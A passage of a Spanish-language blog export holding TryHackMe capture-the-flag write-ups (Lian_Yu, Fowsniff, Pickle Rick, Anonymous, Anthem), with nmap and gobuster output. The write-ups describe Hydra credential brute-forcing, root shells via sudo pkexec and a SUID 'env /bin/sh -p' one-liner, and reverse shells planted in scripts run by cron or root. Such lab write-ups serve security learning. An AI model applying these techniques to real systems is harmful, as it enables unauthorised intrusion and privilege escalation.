GOBUSTER en este directorio nuevo.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt /index.html (Status: 200) /2100 (Status: 301)   En el nuevo directorio encontramos un video de YouTube incrustado en la pagina.\nEn el codigo fuente de esta pagina encontramos un comentarios que indica que podemos aprovechar nuestro .ticket.\nIntentamos ejecutar nuevamente GOBUSTER sobre este directorio para ver si encontramos algun otro directorio o pagina, pero no logramos. Por lo que agregamos ticket como una extension en gobuster. Al hacer esto encontramos una nueva pagina, en la que muestra un \u0026ldquo;token\u0026rdquo;.\n1 2 3  root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 100 -x php,html,txt,ticket /index.html (Status: 200) /green_arrow.ticket (Status: 200)   Utilizamos CyberChef para poder decodificar el token, utilizamos base32.\nFTP Ahora tenemos una palabra clave y un token, utilizamos ambos como credenciales en el servicio FTP y logramos obtener acceso.\nVemos varios archivos los cuales descargamos, la mayoria, imagenes. Al analizar las imagenes nos damos cuenta de que una de ellas aun teniendo la extension PNG sus magic numbers no son los que deberian.\nUtilizamos hexeditor para editar y agregar los magic numbers de una imagen PNG.\n89 50 4E 47 0D 0A 1A 0A STEGANOGRAFIA Al realizar los cambios vemos en la imagen una contraseña. Pero ¿para qué?.\nEn las imagenes que descargamos vemos una con extension jpg, inspeccionamos esta imagen para ver si existe un archivo dentro de esta, utilizando steghide junto a la contraseña. El resultado nos muestra que hay dos archivos.\nExtraemos los archivos y vemos un mensaje en uno de estos y lo que parece ser una contraseña en el otro.\nUSER - SSH Intentamos utilizar la contraseña que encontramos en el servicio SSH con el usuario de FTP, pero no logramos obtener acceso. Regresamos nuevamente a FTP, y revisamos el directorio actual, vemos que es en el home, intentamos regresar y vemos el nombre de el otro usuario.\nUtilizamos la contraseña con este usuario y logramos obtener acceso y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando pkexec. Utilizamos pkexec para obtener una shell root.\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"Lian_Yu es una maquina de TryHackMe, la enumeracion permitió obtener credenciales para FTP donde encontramos un reto de Esteganografia que nos dio acceso. finalmente obtuvimos una shell root con pkexec.","id":74,"section":"posts","tags":["ftp","xxd","hexeditor","steganography","steghide"],"title":"TryHackMe - Lian_Yu","uri":"https://sckull.github.io/posts/lianyu/"},{"content":"  Fowsniff CTF es una maquina de TryHackMe, presenta un reto OSINT donde obtuvimos credenciales que, junto con Hydra logramos obtener acceso a POP3 (Protocolo de Oficina Postal), en este ultimo encontramos contraseñas y usuarios las cuales utilzamos en Hydra para obtener acceso por SSH. Editamos un script que pertenece a pam_motd y que es ejecutado por root para escalar privilegios.\nRoom    Titulo Fowsniff CTF      Descripción Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!   Puntos 450   Dificultad Facil   Maker ben     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto 80 (http), imap/pop3 (110,143) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  # Nmap 7.80 scan initiated Mon Jun 22 18:36:02 2020 as: nmap -sV -o nmap_scan_mini fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.16s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:36:34 2020 -- 1 IP address (1 host up) scanned in 31.57 seconds # Nmap 7.80 scan initiated Mon Jun 22 18:35:44 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan fowsniff.thm Nmap scan report for fowsniff.thm (10.10.225.64) Host is up (0.18s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA) | 256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA) |_ 256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Fowsniff Corp - Delivering Solutions 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: TOP SASL(PLAIN) UIDL USER AUTH-RESP-CODE PIPELINING CAPA RESP-CODES 143/tcp open imap Dovecot imapd |_imap-capabilities: IMAP4rev1 AUTH=PLAINA0001 SASL-IR Pre-login IDLE post-login have OK LITERAL+ more ENABLE capabilities LOGIN-REFERRALS ID listed Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jun 22 18:53:29 2020 -- 1 IP address (1 host up) scanned in 1065.82 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\nroot@upset:~/thm/fowsniff# gobuster dir -u http://fowsniff.thm/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25 /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /LICENSE.txt (Status: 200) /README.txt (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /security.txt (Status: 200) /server-status (Status: 403) Security.txt Encontramos un archivo en el que indica que la pagina/empresa fue hackeada.\nTwitter Fowsniff Dentro de la pagina vemos un mensaje que indica que Fowsniff sufrio una filtracion de datos de la empresa, incluyendo la cuenta de twitter.\nEn la cuenta encontramos dos tweets con direcciones hacia pastebin.\nEn uno de estos encontramos una lista de emails y hashes md5.\nUtilizamos crackstation.net para crackear estos hashes. Logramos obtener el resultado de la mayoria de hashes.\nHYDRA/TELNET - POP3 Utilizamos hydra con los usuarios y constraseñas que encontramos. Y logramos obtener unas credenciales que podemos utilizar en este servicio.\nUtilizamos telnet con el puerto 110 para conectarnos y utilizando los comandos de POP3\nPrimer correo Encontramos en uno de los correos una contraseña temporal para conectarse en el servicio SSH.\nroot@upset:~/thm/fowsniff# telnet fowsniff.thm 110 Trying 10.10.225.64... Connected to fowsniff.thm. Escape character is '^]'. +OK Welcome to the Fowsniff Corporate Mail Server! USER [... spoiler ...] +OK PASS [... spoiler ...] +OK Logged in. STAT +OK 2 2902 LIST +OK 2 messages: 1 1622 2 1280 . RETR 1 +OK 1622 octets Return-Path: \u0026lt;[... spoiler ...]\u0026gt; X-Original-To: [... spoiler ...]@fowsniff Delivered-To: [... spoiler ...]@fowsniff Received: by fowsniff (Postfix, from userid 1000) id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT) To: [... spoiler ...] Subject: URGENT! Security EVENT! Message-Id: \u0026lt;20180313185107.0FA3916A@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT) From: stone@fowsniff (stone) Dear All, A few days ago, a malicious actor was able to gain entry to our internal email systems. The attacker was able to exploit incorrectly filtered escape characters within our SQL database to access our login credentials. Both the SQL and authentication system used legacy methods that had not been updated in some time. We have been instructed to perform a complete internal system overhaul. While the main systems are \u0026quot;in the shop,\u0026quot; we have moved to this isolated, temporary server that has minimal functionality. This server is capable of sending and receiving emails, but only locally. That means you can only send emails to other users, not to the world wide web. You can, however, access this system via the SSH protocol. The temporary password for SSH is \u0026quot;[... spoiler ...]\u0026quot; You MUST change this password as soon as possible, and you will do so under my guidance. I saw the leak the attacker posted online, and I must say that your passwords were not very secure. Come see me in my office at your earliest convenience and we'll set it up. Thanks, A.J Stone Segundo correo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  RETR 2 +OK 1280 octets Return-Path: \u0026lt;[... spoiler ...]\u0026gt; X-Original-To: [... spoiler ...] Delivered-To: [... spoiler ...] Received: by fowsniff (Postfix, from userid 1004) id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT) To: [... spoiler ...] Subject: You missed out! Message-Id: \u0026lt;20180313185405.101CA1AC2@fowsniff\u0026gt; Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT) From: [... spoiler ...] Devin, You should have seen the brass lay into AJ today! We are going to be talking about this one for a looooong time hahaha. Who knew the regional manager had been in the navy? She was swearing like a sailor! I don\u0026#39;t know what kind of pneumonia or something you brought back with you from your camping trip, but I think I\u0026#39;m coming down with it myself. How long have you been gone - a week? Next time you\u0026#39;re going to get sick and miss the managerial blowout of the century, at least keep it to yourself! I\u0026#39;m going to head home early and eat some chicken soup. I think I just got an email from Stone, too, but it\u0026#39;s probably just some \u0026#34;Let me explain the tone of my meeting with management\u0026#34; face-saving mail. I\u0026#39;ll read it when I get back. Feel better, Skyler PS: Make sure you change your email password. AJ had been telling us to do that right before Captain Profanity showed up.   USER - BAKSTEEN Nuevamente utilizamos hydra con los usuarios y la contraseña nueva que econtramos pero esta vez en el servicio ssh.\nEncontramos la contraseña del usuario baksteen.\nIniciamos sesion en el servicio ssh y obtenemos una shell.\nPRIVILEGE ESCALATION Dentro de nuestra shell buscamos archivos que fuera interesantes que nos ayudaran a escalar privilegios, encontramos un archivo interesante en la carpeta /opt/. Al revisar este archivo encontramos que es el \u0026ldquo;banner\u0026rdquo; del servicio SSH y además el dueño del archivo es el usuario PAREDE.\nRevisamos los archivos que pertenecen al \u0026ldquo;banner\u0026rdquo; y vemos que sí se ejecuta. Pero este archivo que ejecuta el archivo en /opt/ es el usuario root.\nYa que el archivo es un script en bash, vamos a agregar una shell inversa, que al iniciar nuevamente con el usuario BAKSTEEN en el servicio SSH se ejecuta. Logramos obtener una shell con usuario root.\nAdemás vemos nuestra flag.txt en la carpeta principal de root.\n","description":"Fowsniff CTF es una maquina de TryHackMe, presenta un reto OSINT donde obtuvimos credenciales que, junto con Hydra logramos obtener acceso a POP3 (Protocolo de Oficina Postal), en este ultimo encontramos contraseñas y usuarios las cuales utilzamos en Hydra para obtener acceso por SSH. Editamos un script que pertenece a pam_motd y que es ejecutado por root para escalar privilegios.","id":75,"section":"posts","tags":["telnet","pop3","pam_motd"],"title":"TryHackMe - Fowsniff CTF","uri":"https://sckull.github.io/posts/fowsniff/"},{"content":"  Pickle Rick es una maquina de TryHackMe de tipo CTF Like presenta algunos retos y preguntas.\nRoom    Titulo Pickle Rick      Descripción A Rick and Morty CTF. Help turn Rick back into a human!   Puntos 240   Dificultad Facil   Maker tryhackme     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # Nmap 7.80 scan initiated Sun Jun 21 01:49:13 2020 as: nmap -sV -o nmap_scan_mini picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 01:49:46 2020 -- 1 IP address (1 host up) scanned in 32.90 seconds # Nmap 7.80 scan initiated Sun Jun 21 01:49:14 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan picklerick.thm Nmap scan report for picklerick.thm (10.10.196.129) Host is up (0.17s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 84:2d:fc:6a:81:e4:da:21:a5:b8:8f:0f:3c:8d:74:1a (RSA) | 256 e5:aa:df:44:6c:ad:56:d0:91:d0:43:c8:a8:30:4c:2d (ECDSA) |_ 256 b9:24:ea:f6:3b:3c:ba:14:58:bb:e8:7b:6c:2c:1b:53 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Rick is sup4r cool Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 02:05:52 2020 -- 1 IP address (1 host up) scanned in 997.58 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8  root@upset:~/thm/picklerick# gobuster dir -u http://picklerick.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /assets (Status: 301) /denied.php (Status: 302) /index.html (Status: 200) /login.php (Status: 200) /portal.php (Status: 302) /robots.txt (Status: 200) /server-status (Status: 403)   En el codigo fuente de la pagina principal encontramos un comentario que indica un nombre de usuario.\nEn el archivo robots.txt encontramos una frase.\nEn la pagina login.php encontramos un panel de inicio de sesion.\nUtilizamos el usuario que encontramos con la frase en robots.txt y logramos obtener acceso al portal de la pagina.\nIngredientes En el portal encontramos un input en el que podemos ejecutar comandos.\nListamos los comandos pero no podemos utilizar cat al parecer esta bloqueado, pero podemos utilizar less para leer los archivos por lo que podemos leer los archivos del sistema y de la pagina, y vemos los comandos que no estan permitidos.\nPrimer Ingrediente Encontramos el Primer Ingrediente en el directorio actual.\nSegundo Ingrediente El Segundo Ingrediente lo encontramos en el directorio principal de rick, pero el dueño del archivo es el usuario root.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar cualquier comando sin contraseña.\nCon sudo less podemos leer el Segundo Ingrediente.\nTercer Ingrediente En el directorio principal del usuario root encontramos el Tercer Ingrediente.\nTercer Ingrediente.\n","description":"Pickle Rick es una maquina de TryHackMe de tipo CTF Like presenta algunos retos y preguntas.","id":76,"section":"posts","tags":[],"title":"TryHackMe - Pickle Rick","uri":"https://sckull.github.io/posts/picklerick/"},{"content":"  Anonymous es una maquina de TryHackMe, dentro del servicio FTP encontramos un script que realiza una \u0026ldquo;limpieza\u0026rdquo;, supusimos que este era ejecutado por algun cron por lo que reemplazamos su contenido con una shell inversa para obtener acceso. Utilizando el comando env con permisos SUID obtuvimos acceso como root.\nRoom    Titulo Anonymous      Descripción Not the hacking group   Puntos 480   Dificultad Media   Maker Nameless0ne     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), smb (445, 139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  # Nmap 7.80 scan initiated Sat Jun 20 23:42:51 2020 as: nmap -sV -o nmap_scan_mini anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.15s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 23:43:24 2020 -- 1 IP address (1 host up) scanned in 32.72 seconds # Nmap 7.80 scan initiated Sat Jun 20 23:52:25 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anonymous.thm Nmap scan report for anonymous.thm (10.10.243.66) Host is up (0.16s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxrwxrwx 2 111 113 4096 Jun 21 04:41 scripts [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA) | 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA) |_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: anonymous | NetBIOS computer name: ANONYMOUS\\x00 | Domain name: \\x00 | FQDN: anonymous |_ System time: 2020-06-21T05:05:33+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T05:05:33 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 21 00:05:40 2020 -- 1 IP address (1 host up) scanned in 795.29 seconds   FTP Mediante el servicio ftp en el puerto 21 ingresamos como anonymous (anonymous:anonymous) y pudimos listar los archivos y carpetas de la maquina, además descargarlos.\n  En el archivo clean.sh encontramos un script en bash el cual elimina los archivos que se encuentran en la carpeta /tmp/.\n  El segundo archivoremoved_files.log que tiene el log de archivos que se han eliminado por el script clean.sh.\n  Por ultimo está el archivo to_do.txt, muestra un mensaje que seguramente algun usuario escribió.\n  SMB Utilizamos smbclient para obtener informacion del servicio SAMBA en donde encontramos algunos SHARENAMES.\nEn el SHARENAME pics es el unico en donde logramos entrar sin credenciales, en donde encontramos dos imagenes.\nEn el servicio SAMBA no logramos hacer nada, ya que solo tenemos el permiso de LISTAR\nFTP - USER Volvimos nuevamente al servicio FTP. Dentro de este servicio tenemos permisos para subir archivos, logramos subir un archivo de prueba.\nEn la carpeta a la que tenemos acceso hay un script (clean.sh) descrito anteriormente, intentamos reemplazar este archivo, en el que pusimos un pequeño comando de ping (ping -c 5 10.10.10.10) hacia nuestra IP. Hacemos esto ya que consideramos que alguien debe de ejecutar el script para poder limpiar la carpeta /tmp/, además que el archivo de log (removed_files.log) del script, cada vez tiene más lineas.\nSubimos el archivo y con tcpdump capturamos el trafico de ping (icmp).\nLogramos obtener respuesta desde la maquina hacia la nuestra, por lo que sabemos que el script es ejecutado, probablemente por un cronjob.\nVolvemos a sobreescribir el archivo clean.sh pero esta vez con una shell inversa. Ponemos a la escucha nuestra maquina (nc -lvp 1338).\nLogramos obtener una shell y nuestra flag user.txt.\nAdemás, podemos ver el cronjob que se ejecuta en la maquina.\nPRIVILEGE ESCALATION Hacemos una enumeracion de binarios SUID con find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah y vemos que existe env en la maquina. Utilizamos env para obtener una shell root.\nEjecutamos /usr/bin/env /bin/sh -p, obtenemos una shell como usuario root y nuestra flag root.txt.\n","description":"Anonymous es una maquina de TryHackMe, dentro del servicio FTP encontramos un script que realiza una \"limpieza\", supusimos que este era ejecutado por algun cron por lo que reemplazamos su contenido con una shell inversa para obtener acceso. Utilizando el comando env con permisos SUID obtuvimos acceso como root.","id":77,"section":"posts","tags":["ftp","smbclient","suid"],"title":"TryHackMe - Anonymous","uri":"https://sckull.github.io/posts/anonymous/"},{"content":"  Anthem es una maquina de TryHackMe, presenta el CMS Umbranco, encontramos unos posts que nos permitieron encontrar credenciales, mismas que utilizamos en RDP. Un archivo oculto al cual le dimos permisos contenia una frase que utilizamos para obtener acceso privilegiado.\nRoom    Titulo Anthem      Descripción Exploit a Windows machine in this beginner level challenge.   Puntos 970   Dificultad Facil   Maker Chevalier     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto rdp (3389) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  # Nmap 7.80 scan initiated Sat Jun 20 18:56:03 2020 as: nmap -sV -o nmap_scan_mini anthem.thm Nmap scan report for anthem.thm (10.10.109.143) Host is up (0.19s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 18:58:39 2020 -- 1 IP address (1 host up) scanned in 156.11 seconds # Nmap 7.80 scan initiated Sat Jun 20 20:27:23 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan anthem.thm Warning: 10.10.194.228 giving up on port because retransmission cap hit (6). Nmap scan report for anthem.thm (10.10.194.228) Host is up (0.18s latency). Not shown: 65520 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 4 disallowed entries |_/bin/ /config/ /umbraco/ /umbraco_client/ |_http-title: Anthem.com - Welcome to our blog 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-LU09299160F | NetBIOS_Domain_Name: WIN-LU09299160F | NetBIOS_Computer_Name: WIN-LU09299160F | DNS_Domain_Name: WIN-LU09299160F | DNS_Computer_Name: WIN-LU09299160F | Product_Version: 10.0.17763 |_ System_Time: 2020-06-21T01:45:48+00:00 | ssl-cert: Subject: commonName=WIN-LU09299160F | Not valid before: 2020-04-04T22:56:38 |_Not valid after: 2020-10-04T22:56:38 |_ssl-date: 2020-06-21T01:45:58+00:00; 0s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 20106/tcp filtered unknown 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-06-21T01:45:49 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 20 20:45:59 2020 -- 1 IP address (1 host up) scanned in 1116.48 seconds   HTTP Pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  root@upset:~/thm/anthem# gobuster dir -u http://anthem.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /Archive (Status: 301) /archive (Status: 301) /authors (Status: 200) /Blog (Status: 200) /blog (Status: 200) /categories (Status: 200) /install (Status: 302) /robots.txt (Status: 200) /robots.txt (Status: 200) /rss (Status: 200) /RSS (Status: 200) /search (Status: 200) /Search (Status: 200) /sitemap (Status: 200) /SiteMap (Status: 200) /tags (Status: 200) /umbraco (Status: 200)   Encontramos en el archivo robots.txt direcciones que no aparecen en GOBUSTER, además encontramos una frase que posiblemente sea util.\nVisitamos /umbranco y encontramos un panel de inicio de sesion, pero aun no tenemos credenciales.\nEn uno de los Posts de la pagina, encontramos un correo, que nos podria servir para encontrar otros.\nIntentamos utilizar el correo junto a la frase que encontramos pero no funcionó en /umbranco. En una de las pistas del CTF nos dice que utilicemos nuestro buscador favorito, pero ¿qué vamos a buscar?.\nDentro de uno de los posts encontramos un poema, al buscar este poema en internet encontramos un nombre del que parece ser el autor de este.\nAutor\nUNBRANCO Con esto, logramos encontrar el nombre del administrador y el correo (con el patron Jose Lopez -\u0026gt; JL@dominio.com). Intentamos utilizar el correo con la frase encontrada en /umbranco y logramos obtener acceso.\nLa version de Umbraco es 7.15.4 por lo que no encontramos un exploit que pudiera ayudarnos a tener acceso en la maquina.\nRDP - USER Intentamos mediante el servicio RDP con las credenciales y logramos acceder mediante este.\nInstalacion de Remmina:\n1  apt install remmina   Logramos obtener una sesion y la flag user.txt.\nADMINISTRATOR - USER Teniendo una sesion en la maquina buscamos informacion que pudiera ayudarnos a escalar privilegios, no encontramos binarios, archivos o servicios en los cuales apoyarnos. Pero, al revisar las carpetas nos damos cuenta que no esta activada la opcion de que permite ver archivos ocultos. La activamos y encontramos un archivo en el directorio principal del disco.\nAl intentar abrir el archivo nos muestra un mensaje de que no tenemos permisos.\nVemos las propiedades del archivo y vemos que no tiene ningun grupo o usuario permitido escribir, leer o modificar. Agregamos nuestro usuario al archivo. Escribimos el nombre de nuestro usuario y damos Check Names y automaticamente lo agrega con el nombre del equipo.\nAplicamos y vemos que nuestro usuario tiene todos los permisos permitidos.\nAbrimos el archivo, logramos leer el archivo y vemos una frase dentro.\nAgregamos una nueva conexion al servicio RDP pero con el usuario administrator y con la frase que encontramos.\nLogramos obtener una sesion y nuestra flag root.txt.\nFLAGS EXTRA FLAG 1 La encontramos en el primer post.\nFLAG 2 La flag la encontramos en el codigo fuente de la pagina.\nFLAG 3 La encontramos en el perfil de Jane Doe.\nFLAG 4 Encontramos la flag en el segundo post.\n","description":"Anthem es una maquina de TryHackMe, presenta el CMS Umbranco, encontramos unos posts que nos permitieron encontrar credenciales, mismas que utilizamos en RDP. Un archivo oculto al cual le dimos permisos contenia una frase que utilizamos para obtener acceso privilegiado.","id":78,"section":"posts","tags":["rdp","umbranco"],"title":"TryHackMe - Anthem","uri":"https://sckull.github.io/posts/anthem/"},{"content":"  Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.\nInformacion de la Maquina    Nombre Monteverde      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7.9, 8.1, 6.7, 3.3, 1.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 9, 7, 3, 1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp/udp y servicios con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 